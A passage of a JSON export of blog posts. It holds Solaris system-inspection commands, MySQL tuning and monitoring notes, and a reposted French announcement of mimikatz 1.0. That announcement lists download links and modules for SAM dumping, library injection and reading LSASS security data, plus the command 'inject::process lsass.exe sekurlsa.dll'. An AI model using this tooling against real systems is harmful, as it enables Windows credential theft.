2160 sectors/cylinder * 3882 cylinders * 3880 accessible cylinders * * Flags: * 1: unmountable * 10: read-only * * Unallocated space: * First Sector Last * Sector Count Sector * 8277120 103680 8380799 * * First Sector Last * Partition Tag Flags Sector Count Sector Mount Directory 0 2 00 0 2049840 2049839 / 1 3 01 2049840 615600 2665439 2 5 00 0 8380800 8380799 5 0 00 2665440 2458080 5123519 /opt 6 4 00 5123520 3073680 8197199 /usr 7 8 00 8197200 79920 8277119 /export/home</p><p>5)．显示已经使用和未使用的i-node数目 <br /># df –F ufs –o i </p><p>Filesystem iused ifree %iused Mounted on /dev/dsk/c0t0d0s0 7859 479821 2% / /dev/dsk/c0t0d0s6 37763 339517 10% /usr /dev/dsk/c0t0d0s5 722 301102 0% /opt /dev/dsk/c0t0d0s7 4 24380 0% /export/home</p><p>6).显示cpu使用率最高的进程 <br /># ps –eo pid,pcpu,args | sort +1n </p><p>该命令输出当前系统进程的pid, CPU占用率及命令描述，并以pcpu来排序</p><p>7)．显示内存占用率最高的进程 <br /># ps –eo pid,vsz,args | sort +1n </p><p>该命令输出当前系统进程的pid，内存占用率及命令描述，并以vsz来排序</p><p>8)．查看及启动系统的32位或64位内核模式 64位模式 <br /># isalist –v </p><p>sparcv9+vis sparcv9 sparcv8plus+vis sparcv8plus sparcv8 sparcv8-fsmuld sparcv7 sparc <br /># isainfo –v </p><p>64-bit sparcv9 applications 32-bit sparc applications <br /># isainfo –b </p><p>64 启动64位内核模式 ok. boot kernel/sparcv9/unix 32位模式 <br /># isalist –v&nbsp;</p><p>sparcv8plus+vis sparcv8plus sparcv8 sparcv8-fsmuld sparcv7 sparc <br /># isainfo –v </p><p>32-bit sparc applications <br /># isainfo –b </p><p>32 启动32位模式 ok. boot kernel/unix</p><p>9)．查看当前的OpenWindows版本 <br /># showrev –w </p><p>OpenWindows version: X11 Version 6.4.1 5 November 2001</p><p>10)．查看当前CDE的版本 <br /># /usr/ccs/bin/what /usr/dt/bin/dtmail&nbsp;</p><p>/usr/dt/bin/dtmail: CDE Version 1.4.6_06 CDEVersion1.4.6_06</p><p>11)．测定当前的显示器刷新频率 </p><p>/usr/sbin/ffbconfig –rev </p><p>Valid values for -res option are: 1024x768x60 [1] 1024x768x70 [1] 1024x768x75 [1] [2] 1024x768x77 1024x800x84 1152x900x66 1152x900x76 1280x800x76 [1] [2] 1280x1024x60 [1] [2] 1280x1024x67 1280x1024x76 1280x1024x85 [1] [2] 960x680x112s 960x680x108s 640x480x60 [1] [2] 640x480x60i [1] 768x575x50i [1] 1440x900x76 [1] [2] 1600x1000x66 [1] [2] 1600x1000x76 [1] [2] 1600x1280x76 [1] [2] 1920x1080x72 [1] [2] 1920x1080x76 [1] [2] 1920x1200x70 [1] [2] 1920x1200x75 [1] [2] svga [1] 1152 1280 stereo vga [1] [2] ntsc [1] pal [1] none Notes: [1] monitor does not support this resolution. [2] this version of FFB (FFB1) does not support this resolution</p><p>12)．查看系统配置 <br /># /usr/platform/sun4u/sbin/prtdiag –v&nbsp;</p><p>System Configuration: Sun Microsystems sun4u Sun Enterprise 450 (2 X UltraSPAR C-II 432MHz) System clock frequency: 86 MHz Memory size: 1024 Megabytes ========================= CPUs ========================= Run Ecache CPU CPU Brd CPU Module MHz MB Impl. Mask --More-- --- --- ------- ----- ------ ------ ---- SYS 1 1 432 4.0 US-II 10.0 SYS 3 3 432 4.0 US-II 10.0 ========================= Memory ========================= Interlv. Socket Size Bank Group Name (MB) Status ---- ----- ------ ---- ------ 0 none 1901 256 OK 0 none 1902 256 OK 0 none 1903 256 OK 0 none 1904 256 OK 0 none 1701 256 OK 0 none 1702 256 OK ========================= IO Cards ========================= No failures found in Sys\ntem =========================== ========================= Environmental Status ========================= System Temperatures (Celsius): ------------------------------</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>ps：做系统移植的时候，非常有用。网卡芯片什么的，驱动也好移植。</p>"},{"title":"mimikatz 1.0","date":"2012-03-21T01:46:00.000Z","_content":"mimikatz<em>mimikatz</em> 1.0 vient de sortir en version alpha !<p>Cette nouvelle version n’est pas une révolution de &#171;&nbsp;l’ancien&nbsp;&#187; mimikatz 0.x, mais une rationalisation du fonctionnement de ce dernier (elle m’apporte surtout beaucoup plus de souplesse lors de son écriture en C/C++)</p><ul><li><a href=\"http://blog.gentilkiwi.com/downloads/mimikatz_trunk.7z\">http://blog.gentilkiwi.com/downloads/mimikatz_trunk.7z</a></li><li><a href=\"http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip\">http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip</a></li></ul>Modules<p>mimikatz est maintenant organisé autours de modules locaux :</p><ul><li><em><a href=\"http://blog.gentilkiwi.com/mimikatz/standard\">&quot;standard&quot;</a></em> ; commandes de base</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/crypto\">crypto</a> ; Cryptographie et certificats</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/system\">system</a> ; Gestion système</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/process\">process</a> ; Manipulation des processus</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/thread\">thread</a> ; Manipulation des threads</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/service\">service</a> ; Manipulation des services</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/privilege\">privilege</a> ; Manipulation des privilèges</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/winmine\">winmine</a>; Manipulation du démineur de Windows XP (démonstration)</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/nogpo\">nogpo</a> ; Pour éviter quelques GPO triviales</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/samdump\">samdump</a> ; Dump de SAM offline</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/inject\">inject</a> ; Injecteur de librairies</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/ts\">ts</a> ; Manipulations Terminal Server</li><li><em><a href=\"http://blog.gentilkiwi.com/mimikatz/divers\">divers</a></em> ; Fonctions diverses trop petites pour s’émanciper</li></ul><p>A part pour le module &#171;&nbsp;standard&nbsp;&#187;, la séparation du module et de la fonction appelée se fait avec le séparateur ::<br />Exemple : <strong>inject</strong>::process lsass.exe sekurlsa.dll</p>Librairies<p>Ce n’est pas forcément le plus discret, mais j’aime injecter des librairies</p><ul><li><a href=\"http://blog.gentilkiwi.com/mimikatz/sekurlsa\">sekurlsa</a> ; manipulation des données de sécurités dans LSASS</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/klock\">klock</a> ; manipulation de bureaux</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/kelloworld\">kelloworld</a> ; libraire à injecter, pour l’exemple</li></ul>Pilote<p>&#202;tre administrateur n’est pas toujours suffisant, il peut aussi être intéressant de disposer d’un point d’entrée en mode utilisateur.<br />Un pilote, mimikatz.sys est donc disponible.</p><ul><li><a href=\"http://blog.gentilkiwi.com/mimikatz/pilote\">pilote mimikatz.sys</a> ; manipulation noyau</li></ul><p>Les commandes distantes peuvent être appelées en les précédants d’un :</p>","source":"_posts/mimikatz-1.0.md","raw":"title: mimikatz 1.0\ncategories: [网络安全]\ntags: []\ndate: 2012-03-21 09:46:00\n---\nmimikatz<em>mimikatz</em> 1.0 vient de sortir en version alpha !<p>Cette nouvelle version n’est pas une révolution de &#171;&nbsp;l’ancien&nbsp;&#187; mimikatz 0.x, mais une rationalisation du fonctionnement de ce dernier (elle m’apporte surtout beaucoup plus de souplesse lors de son écriture en C/C++)</p><ul><li><a href=\"http://blog.gentilkiwi.com/downloads/mimikatz_trunk.7z\">http://blog.gentilkiwi.com/downloads/mimikatz_trunk.7z</a></li><li><a href=\"http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip\">http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip</a></li></ul>Modules<p>mimikatz est maintenant organisé autours de modules locaux :</p><ul><li><em><a href=\"http://blog.gentilkiwi.com/mimikatz/standard\">&quot;standard&quot;</a></em> ; commandes de base</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/crypto\">crypto</a> ; Cryptographie et certificats</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/system\">system</a> ; Gestion système</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/process\">process</a> ; Manipulation des processus</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/thread\">thread</a> ; Manipulation des threads</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/service\">service</a> ; Manipulation des services</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/privilege\">privilege</a> ; Manipulation des privilèges</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/winmine\">winmine</a>; Manipulation du démineur de Windows XP (démonstration)</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/nogpo\">nogpo</a> ; Pour éviter quelques GPO triviales</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/samdump\">samdump</a> ; Dump de SAM offline</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/inject\">inject</a> ; Injecteur de librairies</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/ts\">ts</a> ; Manipulations Terminal Server</li><li><em><a href=\"http://blog.gentilkiwi.com/mimikatz/divers\">divers</a></em> ; Fonctions diverses trop petites pour s’émanciper</li></ul><p>A part pour le module &#171;&nbsp;standard&nbsp;&#187;, la séparation du module et de la fonction appelée se fait avec le séparateur ::<br />Exemple : <strong>inject</strong>::process lsass.exe sekurlsa.dll</p>Librairies<p>Ce n’est pas forcément le plus discret, mais j’aime injecter des librairies</p><ul><li><a href=\"http://blog.gentilkiwi.com/mimikatz/sekurlsa\">sekurlsa</a> ; manipulation des données de sécurités dans LSASS</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/klock\">klock</a> ; manipulation de bureaux</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/kelloworld\">kelloworld</a> ; libraire à injecter, pour l’exemple</li></ul>Pilote<p>&#202;tre administrateur n’est pas toujours suffisant, il peut aussi être intéressant de disposer d’un point d’entrée en mode utilisateur.<br />Un pilote, mimikatz.sys est donc disponible.</p><ul><li><a href=\"http://blog.gentilkiwi.com/mimikatz/pilote\">pilote mimikatz.sys</a> ; manipulation noyau</li></ul><p>Les commandes distantes peuvent être appelées en les précédants d’un :</p>","slug":"mimikatz-1.0","published":1,"updated":"2023-04-22T05:38:44.828Z","_id":"clgrjlxhz004e7opi7xkf84so","comments":1,"layout":"post","photos":[],"link":"","content":"<p>mimikatz<em>mimikatz</em> 1.0 vient de sortir en version alpha !<p>Cette nouvelle version n’est pas une révolution de &amp;#171;&amp;nbsp;l’ancien&amp;nbsp;&amp;#187; mimikatz 0.x, mais une rationalisation du fonctionnement de ce dernier (elle m’apporte surtout beaucoup plus de souplesse lors de son écriture en C&#x2F;C++)</p><ul><li><a href=\"http://blog.gentilkiwi.com/downloads/mimikatz_trunk.7z\">http://blog.gentilkiwi.com/downloads/mimikatz_trunk.7z</a></li><li><a href=\"http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip\">http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip</a></li></ul>Modules<p>mimikatz est maintenant organisé autours de modules locaux :</p><ul><li><em><a href=\"http://blog.gentilkiwi.com/mimikatz/standard\">&quot;standard&quot;</a></em> ; commandes de base</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/crypto\">crypto</a> ; Cryptographie et certificats</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/system\">system</a> ; Gestion système</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/process\">process</a> ; Manipulation des processus</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/thread\">thread</a> ; Manipulation des threads</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/service\">service</a> ; Manipulation des services</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/privilege\">privilege</a> ; Manipulation des privilèges</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/winmine\">winmine</a>; Manipulation du démineur de Windows XP (démonstration)</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/nogpo\">nogpo</a> ; Pour éviter quelques GPO triviales</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/samdump\">samdump</a> ; Dump de SAM offline</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/inject\">inject</a> ; Injecteur de librairies</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/ts\">ts</a> ; Manipulations Terminal Server</li><li><em><a href=\"http://blog.gentilkiwi.com/mimikatz/divers\">divers</a></em> ; Fonctions diverses trop petites pour s’émanciper</li></ul><p>A part pour le module &amp;#171;&amp;nbsp;standard&amp;nbsp;&amp;#187;, la séparation du module et de la fonction appelée se fait avec le séparateur ::<br />Exemple : <strong>inject</strong>::process lsass.exe sekurlsa.dll</p>Librairies<p>Ce n’est pas forcément le plus discret, mais j’aime injecter des librairies</p><ul><li><a href=\"http://blog.gentilkiwi.com/mimikatz/sekurlsa\">sekurlsa</a> ; manipulation des données de sécurités dans LSASS</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/klock\">klock</a> ; manipulation de bureaux</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/kelloworld\">kelloworld</a> ; libraire à injecter, pour l’exemple</li></ul>Pilote<p>&amp;#202;tre administrateur n’est pas toujours suffisant, il peut aussi être intéressant de disposer d’un point d’entrée en mode utilisateur.<br />Un pilote, mimikatz.sys est donc disponible.</p><ul><li><a href=\"http://blog.gentilkiwi.com/mimikatz/pilote\">pilote mimikatz.sys</a> ; manipulation noyau</li></ul><p>Les commandes distantes peuvent être appelées en les précédants d’un :</p></p>\n","site":{"data":{}},"excerpt":"","more":"<p>mimikatz<em>mimikatz</em> 1.0 vient de sortir en version alpha !<p>Cette nouvelle version n’est pas une révolution de &amp;#171;&amp;nbsp;l’ancien&amp;nbsp;&amp;#187; mimikatz 0.x, mais une rationalisation du fonctionnement de ce dernier (elle m’apporte surtout beaucoup plus de souplesse lors de son écriture en C&#x2F;C++)</p><ul><li><a href=\"http://blog.gentilkiwi.com/downloads/mimikatz_trunk.7z\">http://blog.gentilkiwi.com/downloads/mimikatz_trunk.7z</a></li><li><a href=\"http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip\">http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip</a></li></ul>Modules<p>mimikatz est maintenant organisé autours de modules locaux :</p><ul><li><em><a href=\"http://blog.gentilkiwi.com/mimikatz/standard\">&quot;standard&quot;</a></em> ; commandes de base</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/crypto\">crypto</a> ; Cryptographie et certificats</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/system\">system</a> ; Gestion système</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/process\">process</a> ; Manipulation des processus</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/thread\">thread</a> ; Manipulation des threads</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/service\">service</a> ; Manipulation des services</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/privilege\">privilege</a> ; Manipulation des privilèges</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/winmine\">winmine</a>; Manipulation du démineur de Windows XP (démonstration)</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/nogpo\">nogpo</a> ; Pour éviter quelques GPO triviales</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/samdump\">samdump</a> ; Dump de SAM offline</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/inject\">inject</a> ; Injecteur de librairies</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/ts\">ts</a> ; Manipulations Terminal Server</li><li><em><a href=\"http://blog.gentilkiwi.com/mimikatz/divers\">divers</a></em> ; Fonctions diverses trop petites pour s’émanciper</li></ul><p>A part pour le module &amp;#171;&amp;nbsp;standard&amp;nbsp;&amp;#187;, la séparation du module et de la fonction appelée se fait avec le séparateur ::<br />Exemple : <strong>inject</strong>::process lsass.exe sekurlsa.dll</p>Librairies<p>Ce n’est pas forcément le plus discret, mais j’aime injecter des librairies</p><ul><li><a href=\"http://blog.gentilkiwi.com/mimikatz/sekurlsa\">sekurlsa</a> ; manipulation des données de sécurités dans LSASS</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/klock\">klock</a> ; manipulation de bureaux</li><li><a href=\"http://blog.gentilkiwi.com/mimikatz/kelloworld\">kelloworld</a> ; libraire à injecter, pour l’exemple</li></ul>Pilote<p>&amp;#202;tre administrateur n’est pas toujours suffisant, il peut aussi être intéressant de disposer d’un point d’entrée en mode utilisateur.<br />Un pilote, mimikatz.sys est donc disponible.</p><ul><li><a href=\"http://blog.gentilkiwi.com/mimikatz/pilote\">pilote mimikatz.sys</a> ; manipulation noyau</li></ul><p>Les commandes distantes peuvent être appelées en les précédants d’un :</p></p>\n"},{"title":"mysql cpu占用高的问题","date":"2011-10-14T06:43:00.000Z","_content":"今天发现一台近期MYSQL机器CPU占用很高。\n进入mysql模式\nshow processlist;\n工作量也不大啊，就几条语句。\ncopy tmp table。。。。。\n观察了一个\n写临时的表的和GROUP BY语句很多\n解决方案：添加临时表大小或者优化sql语句\n增加临时表MYSQL最后增加 tmp_table_size值\n默认tmp_table_size 32M\ntmp_table_size = 128M\n重启，负载好多了\n<br />","source":"_posts/mysql-cpu占用高的问题.md","raw":"title: mysql cpu占用高的问题\ncategories: [Mysql]\ntags: []\ndate: 2011-10-14 14:43:00\n---\n今天发现一台近期MYSQL机器CPU占用很高。\n进入mysql模式\nshow processlist;\n工作量也不大啊，就几条语句。\ncopy tmp table。。。。。\n观察了一个\n写临时的表的和GROUP BY语句很多\n解决方案：添加临时表大小或者优化sql语句\n增加临时表MYSQL最后增加 tmp_table_size值\n默认tmp_table_size 32M\ntmp_table_size = 128M\n重启，负载好多了\n<br />","slug":"mysql-cpu占用高的问题","published":1,"updated":"2023-04-22T05:38:44.836Z","_id":"clgrjlxi0004g7opih7jl4ps3","comments":1,"layout":"post","photos":[],"link":"","content":"<p>今天发现一台近期MYSQL机器CPU占用很高。<br>进入mysql模式<br>show processlist;<br>工作量也不大啊，就几条语句。<br>copy tmp table。。。。。<br>观察了一个<br>写临时的表的和GROUP BY语句很多<br>解决方案：添加临时表大小或者优化sql语句<br>增加临时表MYSQL最后增加 tmp_table_size值<br>默认tmp_table_size 32M<br>tmp_table_size &#x3D; 128M<br>重启，负载好多了<br><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天发现一台近期MYSQL机器CPU占用很高。<br>进入mysql模式<br>show processlist;<br>工作量也不大啊，就几条语句。<br>copy tmp table。。。。。<br>观察了一个<br>写临时的表的和GROUP BY语句很多<br>解决方案：添加临时表大小或者优化sql语句<br>增加临时表MYSQL最后增加 tmp_table_size值<br>默认tmp_table_size 32M<br>tmp_table_size &#x3D; 128M<br>重启，负载好多了<br><br /></p>\n"},{"title":"MySQL性能监控小知识","date":"2012-08-10T02:10:00.000Z","_content":"<p>MySQL性能监控小知识<br /><br />一，获取mysql用户下的进程总数<br /><br />ps&nbsp;-ef&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$1}&#39;&nbsp;|&nbsp;grep&nbsp;&quot;mysql&quot;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&quot;grep&quot;&nbsp;|&nbsp;wc-1<br /><br />二，主机性能状态<br /><br />#&nbsp;uptime<br />[root@&nbsp;~]#&nbsp;uptime<br />13:05:52&nbsp;up&nbsp;53&nbsp;days,&nbsp;52&nbsp;min,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br /><br />三，CPU使用率<br /><br />#&nbsp;top<br />或<br />#&nbsp;vmstat<br /><br />四，磁盘IO量<br /><br />#&nbsp;vmstat&nbsp;或&nbsp;#&nbsp;iostat<br />五，swap进出量[内存]<br /><br />#&nbsp;free<br />六，数据库性能状态<br />(1)QPS(每秒Query量)<br />QPS&nbsp;=&nbsp;Questions(or&nbsp;Queries)&nbsp;/&nbsp;seconds<br />mysql&nbsp;&gt;&nbsp;show&nbsp;/*50000&nbsp;global&nbsp;*/&nbsp;status&nbsp;like&nbsp;&#39;Question&#39;;<br /><br />(2)TPS(每秒事务量)<br />TPS&nbsp;=&nbsp;(Com_commit&nbsp;+&nbsp;Com_rollback)&nbsp;/&nbsp;seconds<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Com_commit&#39;;<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Com_rollback&#39;;<br /><br />(3)key&nbsp;Buffer&nbsp;命中率<br />key_buffer_read_hits&nbsp;=&nbsp;(1-key_reads&nbsp;/&nbsp;key_read_requests)&nbsp;*&nbsp;100%<br />key_buffer_write_hits&nbsp;=&nbsp;(1-key_writes&nbsp;/&nbsp;key_write_requests)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Key%&#39;;<br /><br />(4)InnoDB&nbsp;Buffer命中率<br />innodb_buffer_read_hits&nbsp;=&nbsp;(1&nbsp;-&nbsp;innodb_buffer_pool_reads&nbsp;/&nbsp;innodb_buffer_pool_read_requests)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;innodb_buffer_pool_read%&#39;;<br /><br />(5)Query&nbsp;Cache命中率<br />Query_cache_hits&nbsp;=&nbsp;(Qcahce_hits&nbsp;/&nbsp;(Qcache_hits&nbsp;+&nbsp;Qcache_inserts&nbsp;))&nbsp;*&nbsp;100%;<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Qcache%&#39;;<br />(6)Table&nbsp;Cache状态量<br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;open%&#39;;<br /><br />(7)Thread&nbsp;Cache&nbsp;命中率<br />Thread_cache_hits&nbsp;=&nbsp;(1&nbsp;-&nbsp;Threads_created&nbsp;/&nbsp;connections&nbsp;)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Thread%&#39;;<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Connections&#39;;<br /><br />(锁定状态<br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;%lock%&#39;;<br /><br />(9)复制延时量<br />mysql&nbsp;&gt;&nbsp;show&nbsp;slave&nbsp;status<br /><br />(10)&nbsp;Tmp&nbsp;Table&nbsp;状况(临时表状况)<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Create_tmp%&#39;;<br />(11)&nbsp;Binlog&nbsp;Cache&nbsp;使用状况<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Binlog_cache%&#39;;<br /><br />(12)&nbsp;Innodb_log_waits&nbsp;量<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;innodb_log_waits&#39;;<br /><br />开源监控软件<br />一，RRDTool<br />二，Nagios<br />三，MRTG<br />四，Cacti<br /></p>","source":"_posts/MySQL性能监控小知识.md","raw":"title: MySQL性能监控小知识\ncategories: [Linux]\ntags: []\ndate: 2012-08-10 10:10:00\n---\n<p>MySQL性能监控小知识<br /><br />一，获取mysql用户下的进程总数<br /><br />ps&nbsp;-ef&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$1}&#39;&nbsp;|&nbsp;grep&nbsp;&quot;mysql&quot;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&quot;grep&quot;&nbsp;|&nbsp;wc-1<br /><br />二，主机性能状态<br /><br />#&nbsp;uptime<br />[root@&nbsp;~]#&nbsp;uptime<br />13:05:52&nbsp;up&nbsp;53&nbsp;days,&nbsp;52&nbsp;min,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br /><br />三，CPU使用率<br /><br />#&nbsp;top<br />或<br />#&nbsp;vmstat<br /><br />四，磁盘IO量<br /><br />#&nbsp;vmstat&nbsp;或&nbsp;#&nbsp;iostat<br />五，swap进出量[内存]<br /><br />#&nbsp;free<br />六，数据库性能状态<br />(1)QPS(每秒Query量)<br />QPS&nbsp;=&nbsp;Questions(or&nbsp;Queries)&nbsp;/&nbsp;seconds<br />mysql&nbsp;&gt;&nbsp;show&nbsp;/*50000&nbsp;global&nbsp;*/&nbsp;status&nbsp;like&nbsp;&#39;Question&#39;;<br /><br />(2)TPS(每秒事务量)<br />TPS&nbsp;=&nbsp;(Com_commit&nbsp;+&nbsp;Com_rollback)&nbsp;/&nbsp;seconds<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Com_commit&#39;;<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Com_rollback&#39;;<br /><br />(3)key&nbsp;Buffer&nbsp;命中率<br />key_buffer_read_hits&nbsp;=&nbsp;(1-key_reads&nbsp;/&nbsp;key_read_requests)&nbsp;*&nbsp;100%<br />key_buffer_write_hits&nbsp;=&nbsp;(1-key_writes&nbsp;/&nbsp;key_write_requests)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Key%&#39;;<br /><br />(4)InnoDB&nbsp;Buffer命中率<br />innodb_buffer_read_hits&nbsp;=&nbsp;(1&nbsp;-&nbsp;innodb_buffer_pool_reads&nbsp;/&nbsp;innodb_buffer_pool_read_requests)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;innodb_buffer_pool_read%&#39;;<br /><br />(5)Query&nbsp;Cache命中率<br />Query_cache_hits&nbsp;=&nbsp;(Qcahce_hits&nbsp;/&nbsp;(Qcache_hits&nbsp;+&nbsp;Qcache_inserts&nbsp;))&nbsp;*&nbsp;100%;<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Qcache%&#39;;<br />(6)Table&nbsp;Cache状态量<br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;open%&#39;;<br /><br />(7)Thread&nbsp;Cache&nbsp;命中率<br />Thread_cache_hits&nbsp;=&nbsp;(1&nbsp;-&nbsp;Threads_created&nbsp;/&nbsp;connections&nbsp;)&nbsp;*&nbsp;100%<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Thread%&#39;;<br /><br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Connections&#39;;<br /><br />(锁定状态<br />mysql&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;%lock%&#39;;<br /><br />(9)复制延时量<br />mysql&nbsp;&gt;&nbsp;show&nbsp;slave&nbsp;status<br /><br />(10)&nbsp;Tmp&nbsp;Table&nbsp;状况(临时表状况)<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Create_tmp%&#39;;<br />(11)&nbsp;Binlog&nbsp;Cache&nbsp;使用状况<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Binlog_cache%&#39;;<br /><br />(12)&nbsp;Innodb_log_waits&nbsp;量<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;innodb_log_waits&#39;;<br /><br />开源监控软件<br />一，RRDTool<br />二，Nagios<br />三，MRTG<br />四，Cacti<br /></p>","slug":"MySQL性能监控小知识","published":1,"updated":"2023-04-22T05:38:44.675Z","_id":"clgrjlxi1004i7opi3ww62vw3","comments":1,"layout":"post","photos":[],"link":"","content":"<p>MySQL性能监控小知识<br /><br />一，获取mysql用户下的进程总数<br /><br />ps&nbsp;-ef&nbsp;|&nbsp;awk&nbsp;&#39;{print&nbsp;$1}&#39;&nbsp;|&nbsp;grep&nbsp;&quot;mysql&quot;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&quot;grep&quot;&nbsp;|&nbsp;wc-1<br /><br />二，主机性能状态<br /><br />#&nbsp;uptime<br />[root@&nbsp;~]#&nbsp;uptime<br />13:05:52&nbsp;up&nbsp;53&nbsp;days,&nbsp;52&nbsp;min,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br /><br />三，CPU使用率<br /><br />#&nbsp;top<br />或<br />#&nbsp;vmstat<br /><br />四，磁盘IO量<br /><br />#&nbsp;vmstat&nbsp;或&nbsp;#&nbsp;iostat<br />五，swap进出量[内存]<br /><br />#&nbsp;free<br />六，数据库性能状态<br />(1)QPS(每秒Query量)<br />QPS&nbsp;=&nbsp;Questions(or&nbsp;Queries)&nbsp;/&nbsp;seconds<br />mysql&nbsp;&gt;&nbsp;show&nbsp;/*50000&nbsp;global&nbsp;*/&nbsp;status&nbsp;like&nbsp;&#39;Question&#39;;<br /><br />(2)TPS(每秒事务量)<br />TPS&nbsp;=&nbsp;(Com_commit&nbsp;+&nbsp;Com_rollback)&nbsp;/&nbsp;seconds<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Com_commit&#39;;<br />mysql&nbsp;&gt;&nbsp;show&nbsp;status&nbsp;like&nbsp;&#39;Com_rollback&#39;;<br /><br />(3)key&nbsp;Buffer&nbsp;命中率<br 